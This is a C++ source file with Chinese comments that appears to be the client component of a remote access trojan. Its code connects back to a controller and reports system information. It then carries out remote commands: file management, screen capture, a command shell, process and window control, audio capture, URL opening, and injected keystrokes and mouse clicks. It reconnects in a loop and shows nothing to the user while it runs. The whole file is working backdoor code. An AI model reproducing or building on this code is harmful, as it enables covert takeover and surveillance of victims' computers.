// MzServer.cpp : Defines the entry point for the application.
//
//本cpp  一模一样 确认
#include "stdafx.h"
#include "MzServer.h"

#include "FileOperator.h"
#include <cstdio>
#include "ScreenManage.h"
#include "Process.h"
#include "CmdManage.h"
#include "ConnectInfo.h"
#include "WindowManager.h"
#include "Voice.h"
#include <shellapi.h>

//套接字的初始化
DWORD __stdcall ConnectThread(LPVOID lparam)
{
	char Buffer[1024 * 100];
	SOCKET MainSocket=socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port=htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr=inet_addr(ConnectInfo::getConnectInfo()->ipAddress); 

	//连接主控端
	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR )
	{
		return 0;
	}
	else
	{

	}
	SysInfo m_SysInfo;
	GetSystemInfo(m_SysInfo);

	MsgHead msgHead;
	msgHead.dwCmd=SOCKET_CONNECT;//自定义SOCKET_CONNECT为一个数值 用来标识传送系统消息的命令
	msgHead.dwSize=sizeof(SysInfo);//SysInfo是我们自定义的结构 储存着系统的信息

	if(!SendMsg(MainSocket,(char*)&m_SysInfo,&msgHead))//自定义函数传递命令 注意sendmsg我们定义参数2是一个字符串 所以将结构体转化为字符串传输
	{
		closesocket(MainSocket);
		return 1;
	}
	while(1)
	{
		memset(Buffer, 0, sizeof(Buffer));
		if (!RecvMsg(MainSocket, (char *)Buffer, &msgHead))
		{
			shutdown(MainSocket, 0x02);
			closesocket(MainSocket);//此时主控端那边将掉线
			break;
		}

		switch(msgHead.dwCmd)
		{
		case CMD_FILEMANAGE:  
			{
				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);//创建线程处理文件管理
				break;
			}
		case CMD_WINDOW_MANAGER_DLG_SHOW:
			{
				CreateThread(NULL, NULL, WindowManagerThread, NULL, NULL, NULL);//创建线程处理文件管理
				break;
			}
		case CMD_SCREEN_REQUEST://收到了屏幕传输请求
			{
				DWORD *pDWORD = new DWORD;
				*pDWORD = MainSocket;
				CreateThread(NULL, NULL, ScreenManageThread, pDWORD, NULL, NULL);//创建线程处理屏幕传输
				break;
			}
		case CMD_CMD_SHELL_REQUEST://收到了cmd命令行传输请求
			{
				CreateThread(NULL, NULL, CmdManageThread, NULL, NULL, NULL);//创建线程处理CMD 命令 传输
				break;
			}
		case CMD_PROCESS_SHOW:
			{
				CreateThread(NULL, NULL, ProcessdThread, NULL, NULL, NULL);
				break;
			}
		case CMD_VOICE:
			{
			    CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
				break;
			}
		case CMD_OPEN_URL:
			{
				ShellExecute(NULL, "open", Buffer, NULL, NULL, SW_SHOWNORMAL);
				break;
			}
		case CMD_MESSAGEBOX:
			{
				char *pChar = new char[1024 * 22];
				memcpy(pChar,(char*)&MainSocket, sizeof(MainSocket));
				memcpy(pChar + sizeof(MainSocket), Buffer, sizeof(MyMessageBox));
				CreateThread(NULL, NULL, MessageBoxThread,pChar, NULL, NULL);
				break;
			}
		case CMD_HEARTBEAT://心跳包
			{
				//不用处理这里 
			}
			break;
		case CMD_CTRLALTDEL:// Ctrl + Alt + del
			{

			}
			break;
		case CMD_KEYDOWN://WM_KEYDOWN 
			{
				//	XScreenXor OpenDesktop;
				//	::MessageBox(NULL, "key down", "DD", MB_OK);
				int nVirtKey = msgHead.dwExtend1;
				keybd_event((BYTE)nVirtKey,0,0,0);

			}
			break;
		case CMD_KEYUP://WM_KEYUP
			{
				//XScreenXor OpenDesktop;
				int nVirtKey = msgHead.dwExtend1;
				keybd_event((BYTE)nVirtKey,0,KEYEVENTF_KEYUP,0);
			}
			break;
		case CMD_MOUSEMOVE://WM_MOUSEMOVE
			{
				//XScreenXor OpenDesktop;
				//::MessageBox(NULL, "mouse move", "DD", MB_OK);
				POINT pt;
				pt.x = msgHead.dwExtend1;
				pt.y = msgHead.dwExtend2;
				SetCursorPos(pt.x, pt.y);

			}
			break;
		case CMD_LBUTTONDOWN://WM_LBUTTONDOWN
			{
				//XScreenXor OpenDesktop;
				//::MessageBox(NULL, "LBUTTONDOWN", "DD", MB_OK);
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			}
			break;
		case CMD_LBUTTONUP://WM_LBUTTONUP
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			break;
		case CMD_LBUTTONDBLCLK://WM_LBUTTONDBLCLK
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			break;
		case CMD_RBUTTONDOWN://WM_RBUTTONDOWN  
			{
				//::MessageBox(NULL, "RBUTTONDOWN", "DD", MB_OK);
				//	XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
			}
			break;
		case CMD_RBUTTONUP://WM_RBUTTONUP
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
			break;
		case CMD_RBUTTONDBLCLK://WM_RBUTTONDBLCLK
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
			break;
		default:
			{
				break;
			}

		}
	}

	return 1;
}

DWORD __stdcall FileManageThread(LPVOID lparam)//线程处理文件管理
{
	MainFileManage();
	return 0;
}

DWORD __stdcall WindowManagerThread(LPVOID lparam)//线程处理文件管理
{
	windowManager();
	return 0;
}


DWORD __stdcall MessageBoxThread(LPVOID lparam)//线程处理文件管理
{
	SOCKET MainSocket;
	memcpy(&MainSocket, (char*)lparam, sizeof(SOCKET));
	MyMessageBox myMessageBox;
	memcpy(&myMessageBox, (char*)lparam + sizeof(SOCKET), sizeof(MyMessageBox));
	
	if(myMessageBox.category == 2)
		::MessageBox(NULL, myMessageBox.content, myMessageBox.title, MB_OK|MB_ICONERROR);
	else
		::MessageBox(NULL, myMessageBox.content, myMessageBox.title, MB_YESNO);
    delete (char *)lparam;
	return 0;
}


DWORD __stdcall RuningThread(LPVOID lParam)
{
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2,2),&lpWSAData);

	while(1)
	{
		HANDLE hThread=NULL;
		hThread = CreateThread(NULL,NULL,ConnectThread,NULL,NULL,NULL);
		WaitForSingleObject(hThread,INFINITE);//INFINTE无限长 即等待时间无限长 只有当hThread线程结束才继续向下运行
		CloseHandle(hThread);
		Sleep(10000);
	}

	WSACleanup();
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR     lpCmdLine,
					 int       nCmdShow)
{
	// TODO: Place code here.
	HANDLE hThread=NULL;
	hThread=CreateThread(NULL,NULL,RuningThread,NULL,NULL,NULL);
	WaitForSingleObject(hThread,INFINITE);//INFINTE无限长 即等待时间无限长 只有当hThread线程结束才继续向下运行
	CloseHandle(hThread);
	return 0;
}



